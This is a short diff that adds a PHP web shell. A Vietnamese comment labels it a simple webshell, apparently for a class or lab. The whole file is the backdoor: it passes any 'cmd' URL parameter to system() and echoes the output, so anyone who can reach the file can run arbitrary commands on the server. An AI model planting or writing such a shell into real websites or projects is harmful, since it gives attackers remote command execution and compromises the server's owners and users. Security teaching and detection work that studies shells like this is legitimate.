@@ -1,0 +1,7 @@
+<?php
+// Webshell đơn giản - D17CNPM1
+if (isset($_GET['cmd'])) {
+    echo "<pre>";
+    system($_GET['cmd']);
+    echo "</pre>";
+}
